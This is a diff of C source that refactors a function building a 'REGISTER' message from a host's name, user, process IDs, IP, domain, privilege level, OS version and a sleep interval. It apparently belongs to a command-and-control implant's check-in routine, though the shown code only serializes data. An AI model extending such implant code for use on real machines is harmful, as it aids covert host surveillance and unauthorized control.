@@ -5,6 +5,7 @@
 #include "Macros.h"
 #include "Wire.h"
 #include "Instance.h"
+#include "Nax.h"
 
 /* ========= [ LE write helpers ] ========= */
 
@@ -68,51 +69,34 @@ FUNC INT NaxFrameDecode( const PBYTE frame, UINT32 frame_len,
 
 /* Builds REGISTER body (no outer frame header).
  * hn/un/ip/dom/proc are UTF-8 strings with explicit lengths. */
-FUNC INT NaxBuildRegBody( const PCHAR hn,   UINT32 hn_len,
-                          const PCHAR un,   UINT32 un_len,
-                          BYTE        arch,
-                          UINT32      pid,
-                          UINT32      sleep_ms,
-                          UINT32      tid,
-                          const PCHAR ip,   UINT32 ip_len,
-                          const PCHAR dom,  UINT32 dom_len,
-                          const PCHAR proc, UINT32 proc_len,
-                          BYTE        elevated,
-                          UINT32      os_major,
-                          UINT32      os_minor,
-                          UINT16      os_build,
-                          UINT32      parent_pid,
-                          UINT32      acp,
-                          UINT32      oem_cp,
-                          const PCHAR img,  UINT32 img_len,
-                          PBYTE out, UINT32* out_len ) {
-    UINT32 needed = 2 + hn_len + 2 + un_len + 1 + 4 + 4 + 4 +
-                    2 + ip_len + 2 + dom_len + 2 + proc_len +
-                    1 + 4 + 4 + 2 + 4 + 4 + 4 + 2 + img_len;
+FUNC INT NaxBuildRegBody( PNAX_INSTANCE Nax, PNAX_SYSINFO info, PBYTE out, UINT32* out_len ) {
+    UINT32 needed = 2 + info->HnLen + 2 + info->UnLen + 1 + 4 + 4 + 4 +
+                    2 + info->IpLen + 2 + info->DmLen + 2 + info->PnLen +
+                    1 + 4 + 4 + 2 + 4 + 4 + 4 + 2 + info->ImLen;
     if ( *out_len < needed ) return NAX_ERR_NOMEM;
 
     PBYTE p = out;
-    NaxW16( p, (UINT16)hn_len );   p += 2; MmCopy( p, hn, hn_len );   p += hn_len;
-    NaxW16( p, (UINT16)un_len );   p += 2; MmCopy( p, un, un_len );   p += un_len;
-    *p++ = arch;
-    NaxW32( p, pid );              p += 4;
-    NaxW32( p, sleep_ms );         p += 4;
-    NaxW32( p, tid );              p += 4;
-    NaxW16( p, (UINT16)ip_len );   p += 2; MmCopy( p, ip, ip_len );   p += ip_len;
-    NaxW16( p, (UINT16)dom_len );  p += 2; MmCopy( p, dom, dom_len ); p += dom_len;
-    NaxW16( p, (UINT16)proc_len ); p += 2;
-    if ( proc_len > 0 ) MmCopy( p, proc, proc_len );
-    p += proc_len;
-    *p++ = elevated;
-    NaxW32( p, os_major );         p += 4;
-    NaxW32( p, os_minor );         p += 4;
-    NaxW16( p, os_build );         p += 2;
-    NaxW32( p, parent_pid );       p += 4;
-    NaxW32( p, acp );              p += 4;
-    NaxW32( p, oem_cp );           p += 4;
-    NaxW16( p, (UINT16)img_len );  p += 2;
-    if ( img_len > 0 ) MmCopy( p, img, img_len );
-    p += img_len;
+    NaxW16( p, (UINT16)info->HnLen );   p += 2; MmCopy( p, info->Hostname, info->HnLen );   p += info->HnLen;
+    NaxW16( p, (UINT16)info->UnLen );   p += 2; MmCopy( p, info->Username, info->UnLen );   p += info->UnLen;
+    *p++ = NAX_ARCH_X64;
+    NaxW32( p, info->Pid );              p += 4;
+    NaxW32( p, Nax->Config.SleepMs );    p += 4;
+    NaxW32( p, info->Tid );              p += 4;
+    NaxW16( p, (UINT16)info->IpLen );    p += 2; MmCopy( p, info->IpStr, info->IpLen );     p += info->IpLen;
+    NaxW16( p, (UINT16)info->DmLen );    p += 2; MmCopy( p, info->Domain, info->DmLen );    p += info->DmLen;
+    NaxW16( p, (UINT16)info->PnLen );    p += 2;
+    if ( info->PnLen > 0 ) MmCopy( p, info->Procname, info->PnLen );
+    p += info->PnLen;
+    *p++ = Nax->Elevated;
+    NaxW32( p, Nax->OsMajor );           p += 4;
+    NaxW32( p, Nax->OsMinor );           p += 4;
+    NaxW16( p, Nax->OsBuild );           p += 2;
+    NaxW32( p, Nax->ParentPid );         p += 4;
+    NaxW32( p, Nax->Acp );               p += 4;
+    NaxW32( p, Nax->OemCp );             p += 4;
+    NaxW16( p, (UINT16)info->ImLen );    p += 2;
+    if ( info->ImLen > 0 ) MmCopy( p, Nax->ImgPath, info->ImLen );
+    p += info->ImLen;
 
     *out_len = needed;
     return NAX_OK;
